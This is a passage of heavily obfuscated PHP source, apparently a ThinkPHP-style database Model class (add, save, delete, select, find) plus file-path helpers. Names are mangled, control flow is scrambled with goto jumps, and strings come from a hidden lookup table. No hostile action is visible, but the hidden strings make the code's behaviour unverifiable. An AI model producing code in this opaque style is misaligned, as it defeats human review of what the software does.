$EæÀ¶¾ÑƒÉ[1051], $EæÀ¶¾ÑƒÉ[1052] => $EæÀ¶¾ÑƒÉ[1053], $EæÀ¶¾ÑƒÉ[1054] => $EæÀ¶¾ÑƒÉ[1055]); foreach ($a•¡Ã†¬Ã® as $DğÔ“çÎ¸ => $E¤Æ‚…™²¿) { if (!defined($DğÔ“çÎ¸)) { define($DğÔ“çÎ¸, self::systemPath($E¤Æ‚…™²¿)); } } } private static function systemPath($c¾Ñé¸ğ¿) { goto bÈçëìËÖœ; b­ñÑğßŞô: if ($Fñ»ĞÙÈïÛ) { return $Fñ»ĞÙÈïÛ; } if ($c¾Ñé¸ğ¿ == $A¢«ƒó‡º¸[1049]) { $Fñ»ĞÙÈïÛ = self::make(Model($A¢«ƒó‡º¸[748])->systemRootPathAdd($A¢«ƒó‡º¸[1058])); } else { $Fñ»ĞÙÈïÛ = self::systemPath($A¢«ƒó‡º¸[1049]); $c¹­ØÙ•õİ = self::sourceID($Fñ»ĞÙÈïÛ); $Fñ»ĞÙÈïÛ = self::make(Model($A¢«ƒó‡º¸[748])->mkdir($c¹­ØÙ•õİ, $c¾Ñé¸ğ¿)); } Model($A¢«ƒó‡º¸[1057])->set($F…¶ÁÈÍ¡£, $Fñ»ĞÙÈïÛ); goto e¬¬ïÖ¡è; bÈçëìËÖœ: $A¢«ƒó‡º¸ =& $_SERVER[÷ÖêïÔÔÓ]; $F…¶ÁÈÍ¡£ = $A¢«ƒó‡º¸[1056] . ucfirst($c¾Ñé¸ğ¿); $Fñ»ĞÙÈïÛ = Model($A¢«ƒó‡º¸[1057])->get($F…¶ÁÈÍ¡£); goto b­ñÑğßŞô; e¬¬ïÖ¡è: return $Fñ»ĞÙÈïÛ; goto a÷ÚÛ½Ú; a÷ÚÛ½Ú: } public static function systemFolder($Aá¾†…¥ğ) { $aèÙ§ì‡‚ = IO_PATH_SYSTEM_SOURCE . $Aá¾†…¥ğ; $CÀÛ‹·æÇİ = Cache::get($aèÙ§ì‡‚); if (!$CÀÛ‹·æÇİ) { $A±Í‘ƒİ„Ä = IO::infoFull($aèÙ§ì‡‚); if (!$A±Í‘ƒİ„Ä) { $CÀÛ‹·æÇİ = IO::mkdir($aèÙ§ì‡‚, REPEAT_SKIP); } else { $CÀÛ‹·æÇİ = $A±Í‘ƒİ„Ä[$_SERVER[÷ÖêïÔÔÓ][76]]; } Cache::set($aèÙ§ì‡‚, $CÀÛ‹·æÇİ, 3600 * 10); } return $CÀÛ‹·æÇİ; } public static function defaultDriver() { return Model($_SERVER[÷ÖêïÔÔÓ][690])->defaultDriver(); } public static function defaultIO() { $bô×™â”å =& $_SERVER[÷ÖêïÔÔÓ]; $cçƒê«…„¬ = self::defaultDriver(); return $bô×™â”å[1059] . $cçƒê«…„¬[$bô×™â”å[364]] . $bô×™â”å[1046]; } public static function fileTypeList() { $dŸÓ´†Šİµ =& $_SERVER[÷ÖêïÔÔÓ]; $FâŒêÍÑŒä = $GLOBALS[$dŸÓ´†Šİµ[6]][$dŸÓ´†Šİµ[1060]]; foreach ($FâŒêÍÑŒä as $b…Â«™õ“– => $b×ØãËË‡‹) { $eßÆ‹êõ‰… = $dŸÓ´†Šİµ[1061] . $b…Â«™õ“–; $Bô…–µ¾¸ = LNG($eßÆ‹êõ‰…); if ($eßÆ‹êõ‰… != $Bô…–µ¾¸) { $FâŒêÍÑŒä[$b…Â«™õ“–][$dŸÓ´†Šİµ[28]] = $Bô…–µ¾¸; } } return $FâŒêÍÑŒä; } } goto bé—ƒ—Ş; DÔÓèìø¹¦: define($_SERVER[÷ÖêïÔÔÓ][227], 0); define($_SERVER[÷ÖêïÔÔÓ][228], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\154\x65", "\x6f\162\x64\145\x72", "\141\x6c\x69\141\x73", "\x68\x61\x76\x69\x6e\147", "\147\x72\157\x75\x70", "\x6c\x6f\143\x6b", "\144\x69\163\164\151\x6e\x63\164", "\x61\165\x74\x6f", "\146\x69\x6c\x74\145\162", "\166\x61\154\151\144\x61\x74\x65", "\x72\145\163\165\154\164", "\x62\151\156\x64", "\164\x6f\x6b\x65\156"); public function __construct($C¥³ÛÂÉË = '', $cŒâ¥™§Õ¦ = '', $bÚã—ëìŒ· = '') { $E–º«¾’ÊÆ =& $_SERVER[÷ÖêïÔÔÓ]; $this->_initialize(); if (!empty($C¥³ÛÂÉË)) { if (strpos($C¥³ÛÂÉË, $E–º«¾’ÊÆ[92])) { list($this->dbName, $this->name) = explode($E–º«¾’ÊÆ[92], $C¥³ÛÂÉË); } else { $this->name = $C¥³ÛÂÉË; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($cŒâ¥™§Õ¦)) { $this->tablePrefix = $E–º«¾’ÊÆ[33]; } elseif ($E–º«¾’ÊÆ[33] != $cŒâ¥™§Õ¦) { $this->tablePrefix = $cŒâ¥™§Õ¦; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($E–º«¾’ÊÆ[229]); } $this->db(0, empty($this->connection) ? $bÚã—ëìŒ· : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $fˆïÇëÎÅ‰ =& $_SERVER[÷ÖêïÔÔÓ]; if (empty($this->fields)) { if (think_config($fˆïÇëÎÅ‰[230])) { $dŞÓø‹…·ç = $this->dbName ? $this->dbName : think_config($fˆïÇëÎÅ‰[231]); $CŠâ”Ù©…ó = think_var_cache($fˆïÇëÎÅ‰[232] . strtolower(get_path_this($dŞÓø‹…·ç) . $fˆïÇëÎÅ‰[92] . $this->name)); if ($CŠâ”Ù©…ó) { $B‰†ùÅÄƒÎ = think_config($fˆïÇëÎÅ‰[233]); if (empty($B‰†ùÅÄƒÎ) || $CŠâ”Ù©…ó[$fˆïÇëÎÅ‰[234]] == $B‰†ùÅÄƒÎ) { $this->fields = $CŠâ”Ù©…ó; return; } } } $this->flush(); } } public function flush() { goto FİòËí¤Â‹; fê°âÄ©Û»: if (think_config($eÁĞ¢±Ä[230])) { $eßŞ’Ó‹Å§ = $this->dbName ? $this->dbName : think_config($eÁĞ¢±Ä[231]); think_var_cache($eÁĞ¢±Ä[232] . strtolower(get_path_this($eßŞ’Ó‹Å§) . $eÁĞ¢±Ä[92] . $this->name), $this->fields); } goto aˆø·”†‘‡; C¦ƒÖ©è¢Ù: foreach ($Cší‡¦ò°À as $dˆƒÁéÄÚ¬ => $FùÓ´¬¡Óê) { $D„Î’¥«óÀ[$dˆƒÁéÄÚ¬] = $FùÓ´¬¡Óê[$eÁĞ¢±Ä[29]]; if ($FùÓ´¬¡Óê[$eÁĞ¢±Ä[36]]) { $this->fields[$eÁĞ¢±Ä[236]] = $dˆƒÁéÄÚ¬; if ($FùÓ´¬¡Óê[$eÁĞ¢±Ä[39]]) { $this->fields[$eÁĞ¢±Ä[235]] = !0; } } } $this->fields[$eÁĞ¢±Ä[237]] = $D„Î’¥«óÀ; if (think_config($eÁĞ¢±Ä[233])) { $this->fields[$eÁĞ¢±Ä[234]] = think_config($eÁĞ¢±Ä[233]); } goto fê°âÄ©Û»; EÖñ÷¹À‹: if (!$Cší‡¦ò°À) { return !1; } $this->fields = array_keys($Cší‡¦ò°À); $this->fields[$eÁĞ¢±Ä[235]] = !1; goto C¦ƒÖ©è¢Ù; FİòËí¤Â‹: $eÁĞ¢±Ä =& $_SERVER[÷ÖêïÔÔÓ]; $this->db->setModel($this->name); $Cší‡¦ò°À = $this->db->getFields($this->getTableName()); goto EÖñ÷¹À‹; aˆø·”†‘‡: } public function switchModel($fåÊøíïã, $FĞï°¶ÚÉ = array()) { $dâØãÜî„˜ =& $_SERVER[÷ÖêïÔÔÓ]; $D‘öÙªèóø = ucwords(strtolower($fåÊøíïã)) . $dâØãÜî„˜[238]; if (!class_exists($D‘öÙªèóø)) { think_exception($D‘öÙªèóø . think_lang($dâØãÜî„˜[239])); } $this->_extModel = new $D‘öÙªèóø($this->name); if (!empty($FĞï°¶ÚÉ)) { foreach ($FĞï°¶ÚÉ as $D°×˜çá‘Î) { $this->_extModel->setProperty($D°×˜çá‘Î, $this->{$D°×˜çá‘Î}); } } return $this->_extModel; } public function __set($C¥È¶‡î–Œ, $c‘ì»“Ñ) { $this->data[$C¥È¶‡î–Œ] = $c‘ì»“Ñ; } public function __get($b“‚÷ÛÃÇ¦) { return isset($this->data[$b“‚÷ÛÃÇ¦]) ? $this->data[$b“‚÷ÛÃÇ¦] : null; } public function __isset($bÉš™ùì…) { return isset($this->data[$bÉš™ùì…]); } public function __unset($Aœ×•ÕÄÓ) { unset($this->data[$Aœ×•ÕÄÓ]); } public function __call($b‚ñï´†¾, $B²–¶°¹Ã¤) { $BÚÈ½ó¼÷Ö =& $_SERVER[÷ÖêïÔÔÓ]; if (in_array(strtolower($b‚ñï´†¾), $this->methods, !0)) { $this->options[strtolower($b‚ñï´†¾)] = $B²–¶°¹Ã¤[0]; return $this; } elseif (in_array(strtolower($b‚ñï´†¾), array($BÚÈ½ó¼÷Ö[240], $BÚÈ½ó¼÷Ö[241], $BÚÈ½ó¼÷Ö[242], $BÚÈ½ó¼÷Ö[243], $BÚÈ½ó¼÷Ö[244]), !0)) { $bí´Îá¸© = isset($B²–¶°¹Ã¤[0]) ? $B²–¶°¹Ã¤[0] : $BÚÈ½ó¼÷Ö[173]; $bí´Îá¸© = $this->db->parseKey($bí´Îá¸©); return $this->getField(strtoupper($b‚ñï´†¾) . $BÚÈ½ó¼÷Ö[245] . $bí´Îá¸© . $BÚÈ½ó¼÷Ö[246] . $b‚ñï´†¾, $BÚÈ½ó¼÷Ö[240]); } elseif (strtolower(substr($b‚ñï´†¾, 0, 5)) == $BÚÈ½ó¼÷Ö[247]) { $bí´Îá¸© = think_parse_name(substr($b‚ñï´†¾, 5)); $FÎî½ŒĞù[$bí´Îá¸©] = $B²–¶°¹Ã¤[0]; return $this->where($FÎî½ŒĞù)->find(); } elseif (strtolower(substr($b‚ñï´†¾, 0, 10)) == $BÚÈ½ó¼÷Ö[248]) { $Fï­ƒİ¯ë× = think_parse_name(substr($b‚ñï´†¾, 10)); $FÎî½ŒĞù[$Fï­ƒİ¯ë×] = $B²–¶°¹Ã¤[0]; return $this->where($FÎî½ŒĞù)->getField($B²–¶°¹Ã¤[1]); } elseif (isset($this->_scope[$b‚ñï´†¾])) { return $this->scope($b‚ñï´†¾, $B²–¶°¹Ã¤[0]); } elseif (method_exists($this, $b‚ñï´†¾)) { array_unshift($B²–¶°¹Ã¤, $b‚ñï´†¾); return call_user_func_array(array($this, $BÚÈ½ó¼÷Ö[249]), $B²–¶°¹Ã¤); } else { return call_user_func_array(array(parent, $b‚ñï´†¾), $B²–¶°¹Ã¤); } } protected function call() { goto d²¦Ó˜Ó; béäªˆ¸Ì: $EµÊ…ÈÌÕ•[] = $BÁõ¿¦©©î; if (method_exists($this, $BŠãÒÏÒš[251])) { $a©ÍÇ¦†ƒÍ = call_user_func_array(array($this, $BŠãÒÏÒš[252]), array($D¡ŠÑ¿¯¾‰, $EµÊ…ÈÌÕ•)); if (!is_null($a©ÍÇ¦†ƒÍ) && $a©ÍÇ¦†ƒÍ !== !1) { return $a©ÍÇ¦†ƒÍ; } } $F˜†Ù‰·½Õ = call_user_func_array(array($this, $BÁõ¿¦©©î), $EµÊ…ÈÌÕ•); goto Aâ ÎöÕ; Eçª­—Áå¡: $D¡ŠÑ¿¯¾‰ = $BÁõ¿¦©©î; if (is_array($BÁõ¿¦©©î)) { $D¡ŠÑ¿¯¾‰ = $BÁõ¿¦©©î[1]; $BÁõ¿¦©©î = $BÁõ¿¦©©î[0]; } if ($EµÊ…ÈÌÕ•[count($EµÊ…ÈÌÕ•) - 1] === $BÁõ¿¦©©î) { think_exception(__CLASS__ . $BŠãÒÏÒš[4] . $BÁõ¿¦©©î . think_lang($BŠãÒÏÒš[250])); return; } goto béäªˆ¸Ì; d²¦Ó˜Ó: $BŠãÒÏÒš =& $_SERVER[÷ÖêïÔÔÓ]; $EµÊ…ÈÌÕ• = func_get_args(); $BÁõ¿¦©©î = array_shift($EµÊ…ÈÌÕ•); goto Eçª­—Áå¡; Aâ ÎöÕ: if (method_exists($this, $BŠãÒÏÒš[253])) { $a©ÍÇ¦†ƒÍ = call_user_func_array(array($this, $BŠãÒÏÒš[254]), array($D¡ŠÑ¿¯¾‰, $EµÊ…ÈÌÕ•, $F˜†Ù‰·½Õ)); if ($a©ÍÇ¦†ƒÍ) { return $a©ÍÇ¦†ƒÍ; } } return $F˜†Ù‰·½Õ; goto dÆ¶ÅÍíˆÓ; dÆ¶ÅÍíˆÓ: } protected function _initialize() { } protected function _facade($a“¤Î®§Ë) { $C†™Ã¯›¼Å =& $_SERVER[÷ÖêïÔÔÓ]; if (!empty($this->fields)) { foreach ($a“¤Î®§Ë as $aİŒœ‘“å => $B¶ŞÚšÜÔù) { if (!in_array($aİŒœ‘“å, $this->fields, !0)) { unset($a“¤Î®§Ë[$aİŒœ‘“å]); } elseif (is_scalar($B¶ŞÚšÜÔù)) { $this->_parseType($a“¤Î®§Ë, $aİŒœ‘“å); } } } if (!empty($this->options[$C†™Ã¯›¼Å[255]])) { $a“¤Î®§Ë = array_map($this->options[$C†™Ã¯›¼Å[255]], $a“¤Î®§Ë); unset($this->options[$C†™Ã¯›¼Å[255]]); } $this->_beforeWrite($a“¤Î®§Ë); return $a“¤Î®§Ë; } protected function _beforeWrite(&$c®ÙºŒàƒî) { } public function add($Aå˜·¹Øñ… = '', $eİ»È‰‡ = array(), $c ²“•—ˆ¦ = false) { goto Aà„©À‰åŒ; D„ß™‘­Àœ: return $AÇ´ìÊÍùÊ; goto Eä·ƒÛÒ¦È; c–é¼’‹: if (!1 === $this->_beforeInsert($Aå˜·¹Øñ…, $eİ»È‰‡)) { return !1; } $AÇ´ìÊÍùÊ = $this->db->insert($Aå˜·¹Øñ…, $eİ»È‰‡, $c ²“•—ˆ¦); if (!1 !== $AÇ´ìÊÍùÊ) { $a²ñ„Ì¸Ã‘ = $this->getLastInsID(); if ($a²ñ„Ì¸Ã‘) { $Aå˜·¹Øñ…[$this->getPk()] = $a²ñ„Ì¸Ã‘; $this->_after_insert($Aå˜·¹Øñ…, $eİ»È‰‡); return $a²ñ„Ì¸Ã‘; } $this->_after_insert($Aå˜·¹Øñ…, $eİ»È‰‡); } goto D„ß™‘­Àœ; Aà„©À‰åŒ: if (empty($Aå˜·¹Øñ…)) { if (!empty($this->data)) { $Aå˜·¹Øñ… = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[÷ÖêïÔÔÓ][256]); return !1; } } $eİ»È‰‡ = $this->_parseOptions($eİ»È‰‡); $Aå˜·¹Øñ… = $this->_facade($Aå˜·¹Øñ…); goto c–é¼’‹; Eä·ƒÛÒ¦È: } protected function _beforeInsert(&$f—éœŸŠİÂ, $F÷Åñéèƒ) { } protected function _after_insert($CŠ‘Äñªˆ, $E³ÑÚ­‘½‹) { } public function addAll($A¾¿«Èó¼, $eò…Úƒ—ö = array(), $D§ˆ”ßà­å = false) { goto FÓšœè›ˆĞ; FÓšœè›ˆĞ: $a¼É ÁËíë =& $_SERVER[÷ÖêïÔÔÓ]; if (empty($A¾¿«Èó¼)) { $this->error = think_lang($a¼É ÁËíë[256]); return !1; } $eò…Úƒ—ö = $this->_parseOptions($eò…Úƒ—ö); goto CÙ¹íÑ‡; CÙ¹íÑ‡: foreach ($A¾¿«Èó¼ as $cËÛè²£ => $bï½ˆ¥Ÿİê) { $A¾¿«Èó¼[$cËÛè²£] = $this->_facade($bï½ˆ¥Ÿİê); } if (method_exists($this->db, $a¼É ÁËíë[257])) { $bƒå†ÎêÑ® = $this->db->insertAll($A¾¿«Èó¼, $eò…Úƒ—ö, $D§ˆ”ßà­å); } else { $this->startTrans(); foreach ($A¾¿«Èó¼ as $cËÛè²£ => $bï½ˆ¥Ÿİê) { $bƒå†ÎêÑ® = $this->db->insert($bï½ˆ¥Ÿİê, $eò…Úƒ—ö, $D§ˆ”ßà­å); } $this->commit(); } if (!1 !== $bƒå†ÎêÑ®) { $A°â¸Ê·å = $this->getLastInsID(); if ($A°â¸Ê·å) { return $A°â¸Ê·å; } } goto Cİßø¤‹‡ƒ; Cİßø¤‹‡ƒ: return $bƒå†ÎêÑ®; goto Eê»Á¨Ğ©É; Eê»Á¨Ğ©É: } public function selectAdd($B¾‹’‰Öõ = '', $aÁ•‡ÃÂçÁ = '', $Fï’—ÔŠ†Š = array()) { $C…§ßÜî‘• =& $_SERVER[÷ÖêïÔÔÓ]; $Fï’—ÔŠ†Š = $this->_parseOptions($Fï’—ÔŠ†Š); if (!1 === ($Cßš©©Ú’Ş = $this->db->selectInsert($B¾‹’‰Öõ ? $B¾‹’‰Öõ : $Fï’—ÔŠ†Š[$C…§ßÜî‘•[258]], $aÁ•‡ÃÂçÁ ? $aÁ•‡ÃÂçÁ : $this->getTableName(), $Fï’—ÔŠ†Š))) { $this->error = think_lang($C…§ßÜî‘•[259]); return !1; } else { return $Cßš©©Ú’Ş; } } public function save($F÷‘‰÷›Ş = '', $aøÖÆ›Šè = array()) { goto FÚé£»¦Ä; f†ÃÒÙÊÄ: if (!1 !== $eÎµ•É•ôÜ) { if (isset($dšÛ—ÇğÒ)) { $F÷‘‰÷›Ş[$b´‰¨ğÕœ] = $dšÛ—ÇğÒ; } $this->_afterUpdate($F÷‘‰÷›Ş, $aøÖÆ›Šè); } return $eÎµ•É•ôÜ; goto fí ‘º¢’; FÚé£»¦Ä: $Eƒ£Î–Ğ‰¯ =& $_SERVER[÷ÖêïÔÔÓ]; if (empty($F÷‘‰÷›Ş)) { if (!empty($this->data)) { $F÷‘‰÷›Ş = $this->data; $this->data = array(); } else { $this->error = think_lang($Eƒ£Î–Ğ‰¯[256]); return !1; } } $F÷‘‰÷›Ş = $this->_facade($F÷‘‰÷›Ş); goto eïïì˜ÒÈ; eïïì˜ÒÈ: $aøÖÆ›Šè = $this->_parseOptions($aøÖÆ›Šè); $b´‰¨ğÕœ = $this->getPk(); if (!isset($aøÖÆ›Šè[$Eƒ£Î–Ğ‰¯[260]])) { if (isset($F÷‘‰÷›Ş[$b´‰¨ğÕœ])) { $fêË©õŞ·[$b´‰¨ğÕœ] = $F÷‘‰÷›Ş[$b´‰¨ğÕœ]; $aøÖÆ›Šè[$Eƒ£Î–Ğ‰¯[260]] = $fêË©õŞ·; unset($F÷‘‰÷›Ş[$b´‰¨ğÕœ]); } else { $this->error = think_lang($Eƒ£Î–Ğ‰¯[259]); return !1; } } goto b£‡í†—¿¡; b£‡í†—¿¡: if (is_array($aøÖÆ›Šè[$Eƒ£Î–Ğ‰¯[260]]) && isset($aøÖÆ›Šè[$Eƒ£Î–Ğ‰¯[260]][$b´‰¨ğÕœ])) { $dšÛ—ÇğÒ = $aøÖÆ›Šè[$Eƒ£Î–Ğ‰¯[260]][$b´‰¨ğÕœ]; } if (!1 === $this->_beforeUpdate($F÷‘‰÷›Ş, $aøÖÆ›Šè)) { return !1; } $eÎµ•É•ôÜ = $this->db->update($F÷‘‰÷›Ş, $aøÖÆ›Šè); goto f†ÃÒÙÊÄ; fí ‘º¢’: } protected function _beforeUpdate(&$b¡À«®‡¨¨, $a–¼¯éê¡®) { } protected function _afterUpdate($fÀŠ£—õ¦ï, $A†ÑÇó’Ü¿) { } public function delete($c Ÿ¥©Ÿø = array()) { goto dÑµÃ¥Ñ¸; dÑµÃ¥Ñ¸: $A²´Ñ‡à³Á =& $_SERVER[÷ÖêïÔÔÓ]; if (empty($c Ÿ¥©Ÿø) && empty($this->options[$A²´Ñ‡à³Á[260]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $E¥íÏÂİÌ = $this->getPk(); goto cï¢§Ä„—; cï¢§Ä„—: if (is_numeric($c Ÿ¥©Ÿø) || is_string($c Ÿ¥©Ÿø)) { if (strpos($c Ÿ¥©Ÿø, $A²´Ñ‡à³Á[47])) { $c„‡ÏàŠóÅ[$E¥íÏÂİÌ] = array($A²´Ñ‡à³Á[261], $c Ÿ¥©Ÿø); } else { $c„‡ÏàŠóÅ[$E¥íÏÂİÌ] = $c Ÿ¥©Ÿø; } $this->options[$A²´Ñ‡à³Á[260]] = $c„‡ÏàŠóÅ; } $c Ÿ¥©Ÿø = $this->_parseOptions(); if (is_array($c Ÿ¥©Ÿø[$A²´Ñ‡à³Á[260]]) && isset($c Ÿ¥©Ÿø[$A²´Ñ‡à³Á[260]][$E¥íÏÂİÌ])) { $Bãóƒó¢ò = $c Ÿ¥©Ÿø[$A²´Ñ‡à³Á[260]][$E¥íÏÂİÌ]; } goto fÎ²‹êÖƒ„; fÎ²‹êÖƒ„: $eˆŠŸ¨Ëß¢ = $this->db->delete($c Ÿ¥©Ÿø); if (!1 !== $eˆŠŸ¨Ëß¢) { $bôŞŞÏ¤Ñ = array(); if (isset($Bãóƒó¢ò)) { $bôŞŞÏ¤Ñ[$E¥íÏÂİÌ] = $Bãóƒó¢ò; } $this->_after_delete($bôŞŞÏ¤Ñ, $c Ÿ¥©Ÿø); } return $eˆŠŸ¨Ëß¢; goto e‡ï‡“ĞàÃ; e‡ï‡“ĞàÃ: } protected function _after_delete($båõá‚ßøÓ, $C·†¤¾ˆµË) { } public function select($d÷åÄªŒµ§ = array()) { goto cÇ‡¢³Ò•; cÇ‡¢³Ò•: $eëÄËÁ£“ =& $_SERVER[÷ÖêïÔÔÓ]; if (is_string($d÷åÄªŒµ§) || is_numeric($d÷åÄªŒµ§)) { $d™ä±¨áÕä = $this->getPk(); if (strpos($d÷åÄªŒµ§, $eëÄËÁ£“[47])) { $eÊ¯¼³Óø„[$d™ä±¨áÕä] = array($eëÄËÁ£“[261], $d÷åÄªŒµ§); } else { $eÊ¯¼³Óø„[$d™ä±¨áÕä] = $d÷åÄªŒµ§; } $this->options[$eëÄËÁ£“[260]] = $eÊ¯¼³Óø„; } elseif (!1 === $d÷åÄªŒµ§) { $d÷åÄªŒµ§ = $this->_parseOptions(); return $eëÄËÁ£“[262] . $this->db->buildSelectSql($d÷åÄªŒµ§) . $eëÄËÁ£“[263]; } $d÷åÄªŒµ§ = $this->_parseOptions(); goto E¯Ã»°„º; E¯Ã»°„º: $Có”Øª”«Š = $this->db->select($d÷åÄªŒµ§); if (!1 === $Có”Øª”«Š) { return !1; } if (empty($Có”Øª”«Š)) { return null; } goto cŸ¨ã³Š ; cŸ¨ã³Š : $this->_afterSelect($Có”Øª”«Š, $d÷åÄªŒµ§); return $Có”Øª”«Š; goto f®ŒïÅŒï‘; f®ŒïÅŒï‘: } protected function _afterSelect(&$BÊË¨Ä•Ê³, $bÃ«Â„Î¦½) { } public function buildSql($BŠ½×•ƒ² = array()) { $f„˜™‚µšÓ =& $_SERVER[÷ÖêïÔÔÓ]; $BŠ½×•ƒ² = $this->_parseOptions($BŠ½×•ƒ²); return $f„˜™‚µšÓ[262] . $this->db->buildSelectSql($BŠ½×•ƒ²) . $f„˜™‚µšÓ[263]; } public function optionsValue($cÆğÛ¨¹ÃÌ = null) { if (is_null($cÆğÛ¨¹ÃÌ)) { return $this->options; } elseif (is_array($cÆğÛ¨¹ÃÌ)) { $this->options = array_merge($this->options, $cÆğÛ¨¹ÃÌ); } } protected function _parseOptions($FÌ¢ÇàùŠ§ = array()) { goto bˆèøç‹¶–; bˆèøç‹¶–: $A—†¥Œõƒ =& $_SERVER[÷ÖêïÔÔÓ]; if (is_array($FÌ¢ÇàùŠ§)) { $FÌ¢ÇàùŠ§ = array_merge($this->options, $FÌ¢ÇàùŠ§); } $this->options = array(); goto f‘©Ì†‹‹œ; f‘©Ì†‹‹œ: if (!isset($FÌ¢ÇàùŠ§[$A—†¥Œõƒ[264]])) { $FÌ¢ÇàùŠ§[$A—†¥Œõƒ[264]] = $this->getTableName(); $c‡ŒÔ¬‹Â² = $this->fields; } else { $c‡ŒÔ¬‹Â² = $this->getDbFields(); } if (!empty($FÌ¢ÇàùŠ§[$A—†¥Œõƒ[265]])) { $FÌ¢ÇàùŠ§[$A—†¥Œõƒ[264]] .= $A—†¥Œõƒ[50] . $FÌ¢ÇàùŠ§[$A—†¥Œõƒ[265]]; } $FÌ¢ÇàùŠ§[$A—†¥Œõƒ[266]] = $this->name; goto EÊÒ©ÅŞÓ; EÊÒ©ÅŞÓ: if (isset($FÌ¢ÇàùŠ§[$A—†¥Œõƒ[260]]) && is_array($FÌ¢ÇàùŠ§[$A—†¥Œõƒ[260]]) && !empty($c‡ŒÔ¬‹Â²) && !isset($FÌ¢ÇàùŠ§[$A—†¥Œõƒ[267]]) && !isset($FÌ¢ÇàùŠ§[$A—†¥Œõƒ[264]])) { foreach ($FÌ¢ÇàùŠ§[$A—†¥Œõƒ[260]] as $F°Š•–á => $FœËÀÀ¿÷½) { $F°Š•–á = trim($F°Š•–á); if (in_array($F°Š•–á, $c‡ŒÔ¬‹Â², !0)) { if (is_scalar($FœËÀÀ¿÷½)) { $this->_parseType($FÌ¢ÇàùŠ§[$A—†¥Œõƒ[260]], $F°Š•–á); } } elseif (!is_numeric($F°Š•–á) && $A—†¥Œõƒ[71] != substr($F°Š•–á, 0, 1) && !1 === strpos($F°Š•–á, $A—†¥Œõƒ[92]) && !1 === strpos($F°Š•–á, $A—†¥Œõƒ[245]) && !1 === strpos($F°Š•–á, $A—†¥Œõƒ[268]) && !1 === strpos($F°Š•–á, $A—†¥Œõƒ[269])) { unset($FÌ¢ÇàùŠ§[$A—†¥Œõƒ[260]][$F°Š•–á]); } } } $this->_options_filter($FÌ¢ÇàùŠ§); return $FÌ¢ÇàùŠ§; goto eÆó‚«ÂÓê; eÆó‚«ÂÓê: } protected function _options_filter(&$eŒÀå’î³) { } protected function _parseType(&$FÇìæ‰¬—, $d±ñ²ø¾‡ª) { $BÏÂ–Ğ”® =& $_SERVER[÷ÖêïÔÔÓ]; if (empty($this->options[$BÏÂ–Ğ”®[270]][$BÏÂ–Ğ”®[4] . $d±ñ²ø¾‡ª])) { $bÇ›–¤™ˆì = strtolower($this->fields[$BÏÂ–Ğ”®[237]][$d±ñ²ø¾‡ª]); if (!1 !== strpos($bÇ›–¤™ˆì, $BÏÂ–Ğ”®[271])) { } elseif (!1 === strpos($bÇ›–¤™ˆì, $BÏÂ–Ğ”®[272]) && !1 !== strpos($bÇ›–¤™ˆì, $BÏÂ–Ğ”®[273])) { $FÇìæ‰¬—[$d±ñ²ø¾‡ª] = intval($FÇìæ‰¬—[$d±ñ²ø¾‡ª]); } elseif (!1 !== strpos($bÇ›–¤™ˆì, $BÏÂ–Ğ”®[274]) || !1 !== strpos($bÇ›–¤™ˆì, $BÏÂ–Ğ”®[275])) { $FÇìæ‰¬—[$d±ñ²ø¾‡ª] = floatval($FÇìæ‰¬—[$d±ñ²ø¾‡ª]); } elseif (!1 !== strpos($bÇ›–¤™ˆì, $BÏÂ–Ğ”®[276])) { $FÇìæ‰¬—[$d±ñ²ø¾‡ª] = (bool) $FÇìæ‰¬—[$d±ñ²ø¾‡ª]; } } } public function find($däÑÃÃéİ• = array()) { goto Aõ£Ï×ö‡…; e“£ë•‰Ä: if (empty($c…“çæÃ)) { return null; } $this->data = $c…“çæÃ[0]; $this->_afterFind($this->data, $däÑÃÃéİ•); goto F¢†±¾¯çì; b»ÇÂóÎ: $däÑÃÃéİ• = $this->_parseOptions(); $c…“çæÃ = $this->db->select($däÑÃÃéİ•); if (!1 === $c…“çæÃ) { return !1; } goto e“£ë•‰Ä; F¢†±¾¯çì: if (!empty($this->options[$eê–ÌºŠ¿„[278]])) { return $this->returnResult($this->data, $this->options[$eê–ÌºŠ¿„[278]]); } return $this->data; goto bÁùƒİª§‹; Aõ£Ï×ö‡…: $eê–ÌºŠ¿„ =& $_SERVER[÷ÖêïÔÔÓ]; if (is_numeric($däÑÃÃéİ•) || is_string($däÑÃÃéİ•)) { $Fßº‡¹ñœ[$this->getPk()] = $däÑÃÃéİ•; $this->options[$eê–ÌºŠ¿„[260]] = $Fßº‡¹ñœ; } $this->options[$eê–ÌºŠ¿„[277]] = 1; goto b»ÇÂóÎ; bÁùƒİª§‹: } protected function _afterFind(&$cµŒ‚æĞ–, $C¡¢¨óæòË) { } protected function returnResult($a‡§Ù»±›´, $DÕ­—”¯†œ = '') { $c–»¢çÆğÆ =& $_SERVER[÷ÖêïÔÔÓ]; if ($DÕ­—”¯†œ) { if (is_callable($DÕ­—”¯†œ)) { return call_user_func($DÕ­—”¯†œ, $a‡§Ù»±›´); } switch (strtolower($DÕ­—”¯†œ)) { case $c–»¢çÆğÆ[279]: return json_encode($a‡§Ù»±›´); case $c–»¢çÆğÆ[280]: return xml_encode($a‡§Ù»±›´); } } return $a‡§Ù»±›´; } public function parseFieldsMap($D…ƒˆê‚ˆ, $C—“šœé… = 1) { if (!empty($this->_map)) { foreach ($this->_map as $fÓ²—Ìš¼ => $b°ãô„¡ÅÛ) { if ($C—“šœé… == 1) { if (isset($D…ƒˆê‚ˆ[$b°ãô„¡ÅÛ])) { $D…ƒˆê‚ˆ[$fÓ²—Ìš¼] = $D…ƒˆê‚ˆ[$b°ãô„¡ÅÛ]; unset($D…ƒˆê‚ˆ[$b°ãô„¡ÅÛ]); } } else { if (isset($D…ƒˆê‚ˆ[$fÓ²—Ìš¼])) { 